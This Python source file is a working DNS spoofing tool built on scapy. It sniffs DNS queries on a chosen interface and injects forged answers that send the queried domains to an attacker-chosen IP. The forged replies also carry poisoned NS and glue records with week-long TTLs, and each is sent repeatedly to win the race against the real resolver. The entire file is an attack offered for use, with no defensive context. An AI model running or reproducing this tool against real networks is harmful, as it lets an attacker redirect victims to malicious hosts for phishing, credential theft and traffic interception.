import sys
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor
import tldextract

# Get list of network interfaces available on the system
ip = scapy.get_if_list()
print(ip)

# Default settings
interface = "wlan0"  # The interface to use for sniffing DNS traffic
attacker_ip = scapy.get_if_addr(interface)  # The IP address you want to inject as the default forged response
num_threads = 50  # Number of threads to run in parallel for brute-forcing the response
port_range = range(1024, 65535)  # Possible range of source ports to randomize
hostnames = {}  # Dictionary to hold IP-hostname pairs from the hostname file

# ThreadPoolExecutor to reduce thread creation overhead
executor = ThreadPoolExecutor(max_workers=num_threads)


# Function to process intercepted DNS packets
def process_packet(packet):
    """
    This function processes each DNS packet that is intercepted. It checks for the DNS layer,
    extracts important information like source/destination IPs and ports, and checks if the DNS
    query is for the domain you want to poison.
    """
    if scapy.DNS in packet:
        dns_layer = packet[scapy.DNS]
        txid = dns_layer.id  # Extract the Transaction ID (TxID) from the DNS query

        # Extract source and destination IP and port information
        src_ip = packet[scapy.IP].src  # The IP address of the client making the DNS query
        dst_ip = packet[scapy.IP].dst  # The IP address of the DNS resolver/server

        # Check if it's using UDP or TCP and extract source/destination ports accordingly
        if scapy.TCP in packet:
            src_port = packet[scapy.TCP].sport
            dst_port = packet[scapy.TCP].dport
        elif scapy.UDP in packet:
            src_port = packet[scapy.UDP].sport
            dst_port = packet[scapy.UDP].dport

        # Filter for DNS queries (qr == 0 means it's a query, not a response)
        if dns_layer.qr == 0:
            query = dns_layer.qd.qname.decode('utf-8')

            # Check if the queried domain matches any in the hostname file or if we should use the default
            hijack_ip = get_hijack_ip(query)

            if hijack_ip:
                print(f"Hijacking DNS request for {query}: {dns_layer.show()}")
                print(f"Source IP: {src_ip}, Source Port: {src_port}, TxID: {txid}")
                print(f"Destination IP: {dst_ip}, Destination Port: {dst_port}")

                # Submit tasks to the ThreadPoolExecutor
                executor.submit(handle_dns_response, txid, query, hijack_ip, src_ip, src_port, dst_ip, dst_port)


# Function to get the hijack IP based on the queried domain
def get_hijack_ip(query):
    """
    Returns the IP to use for hijacking based on the queried domain.
    """
    query = query.rstrip('.')  # Strip any trailing dot
    return hostnames.get(query, attacker_ip)  # Return IP from hostnames if available, else default attacker_ip


# Function to handle DNS response using ThreadPoolExecutor
def handle_dns_response(txid, query, hijack_ip, src_ip, src_port, dst_ip, dst_port):
    """
    Handles the DNS response by generating a forged DNS response and sending it to the victim.
    This is done using the ThreadPoolExecutor to reduce overhead.
    """
    # Craft the DNS payload (forged response)
    forged_payload = dns_payload(txid, query, hijack_ip)

    # Send multiple forged DNS packets to increase chances of winning the race condition
    for _ in range(10):  # Increase this number to flood the resolver with guesses
        send_packet(src_ip=dst_ip, dst_ip=src_ip, dst_port=src_port, payload=forged_payload)
        
        
def extract_domain(query):
    extracted = tldextract.extract(query)
    domain = f"{extracted.domain}.{extracted.suffix}"
    print(domain)
    return domain
    
    


# Function to generate a forged DNS payload (response)
def dns_payload(txid, query, hijack_ip):
    """
    Creates a forged DNS response payload that includes the original TxID and query, 
    but returns a forged IP (hijack_ip) for the domain.
    """
    
    domain_to_poision = extract_domain(query)

    payload = scapy.DNS(
        id=txid,  # Set the TxID to match the one from the query
        qr=1,  # qr = 1 means this is a response
        aa=0,  # Authoritative answer
        ra=1,  # Recursion Available
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=1
    )

    # Add the original query in the Question Section
    payload.qd = scapy.DNSQR(qname=query, qtype="A", qclass="IN")

    payload.an = scapy.DNSRR(rrname=query, type="A", ttl=604800, rdata=hijack_ip)

    # Add the Authority Section (NS record for the forged domain)
    
    payload.ns = scapy.DNSRR(rrname=query, type="NS", rdata=f"ns1.{domain_to_poision }", ttl=84600)
    
    # Add the Additional Section (A record pointing ns1.example.com to the hijacked IP)
    payload.ar = scapy.DNSRR(rrname=f"ns1.{domain_to_poision }", type="A", ttl=604800, rdata=hijack_ip)

    return payload


# Function to send the forged DNS packet
def send_packet(src_ip, dst_ip, dst_port, payload):
    """
    Sends a forged DNS packet back to the client.
    """
    ip_packet = scapy.IP(src=src_ip, dst=dst_ip)
    udp_segment = scapy.UDP(dport=dst_port)
    final_packet = ip_packet / udp_segment / payload
    scapy.send(final_packet, verbose=False)


# Function to load the hostname file if provided
def load_hostname_file(filename):
    """
    Loads a hostname file containing IP-hostname pairs.
    """
    global hostnames
    try:
        with open(filename, 'r') as file:
            for line in file:
                ip, hostname = line.strip().split(',')
                hostnames[hostname.strip()] = ip.strip()
        print(f"Loaded {len(hostnames)} hostnames from {filename}.")
    except FileNotFoundError:
        print(f"Hostname file {filename} not found.")
        sys.exit(1)


# Sniff DNS packets and inject forged responses
def inject():
    """
    Starts sniffing DNS traffic on the specified interface and injects forged responses.
    """
    print("Starting DNS injection...")
    scapy.sniff(iface=interface, filter="ip and udp port 53", prn=process_packet, store=0)


# Command-line argument parsing
def parse_args():
    """
    Parses command-line arguments to get the network interface to sniff on and the hostname file.
    """
    global interface

    if len(sys.argv) < 3 or len(sys.argv) > 5:
        print("Usage: dnsinjector.py [-i interface] [-h hostnames]")
        sys.exit(1)
    for i in range(1, len(sys.argv)):
        if sys.argv[i] == "-i":  # Interface argument
            interface = sys.argv[i + 1]
        elif sys.argv[i] == "-h":  # Hostname file argument
            hostname_file = sys.argv[i + 1]
            load_hostname_file(hostname_file)


# Main program entry point
if __name__ == "__main__":
    parse_args()
    inject()
